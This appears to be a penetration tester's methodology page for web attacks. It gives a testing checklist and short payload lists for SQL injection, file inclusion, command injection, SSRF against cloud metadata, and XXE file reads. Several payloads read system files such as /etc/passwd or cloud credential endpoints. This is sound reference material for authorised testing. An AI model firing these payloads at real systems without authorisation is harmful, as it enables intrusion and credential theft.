---
title: "06 — Web Attacks"
date: 2026-01-01
categories:
  - Tools & Methodologies
  - Methodology
tags: [Methodology, Web Attacks, SQLi, LFI, SSRF, XXE, File Upload, Burp Suite]
description: "Web attack methodology — checklist, SQLi/LFI/SSRF/XXE quick detection, command injection, file upload attacks, and Burp Suite workflow."
---

> 📁 **Source:** [github.com/sireton/pentest-vault/06-Web-Attacks](https://github.com/sireton/pentest-vault)  
> ← [Back to Methodology Index](/posts/methodology-index/)

---

#web #phase

## Sub-Pages
- [[06-Web-Attacks/SQLi]]
- [[06-Web-Attacks/File Inclusion]]
- [[06-Web-Attacks/File Upload Attacks]]

---

## Web Checklist
- [ ] Tech fingerprinting (whatweb, Wappalyzer)
- [ ] Directory/file fuzzing
- [ ] Parameter fuzzing
- [ ] All input fields for injection
- [ ] LFI/RFI in file/path parameters
- [ ] SQLi in all DB-touching inputs
- [ ] File upload functionality
- [ ] IDOR in IDs/references
- [ ] Authentication (brute, bypass, default creds)
- [ ] SSRF in URL parameters
- [ ] JS review for API keys / endpoints

---

## Quick Wins

### SQLi Detection
```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
admin'--
```

### LFI Detection
```
?file=../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
```

### Command Injection
```
;whoami
|whoami
`whoami`
$(whoami)
```

### SSRF
```
?url=http://127.0.0.1/admin
?url=http://169.254.169.254/latest/meta-data/
?url=file:///etc/passwd
```

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

---
*See also: [[01-Recon/Recon Index]] | [[00-Meta/Shell Upgrades & Tricks]]*


---

*Previous: [Methodology Active Directory](/posts/methodology-active-directory/) · Next: [Methodology Pillaging](/posts/methodology-pillaging/)*
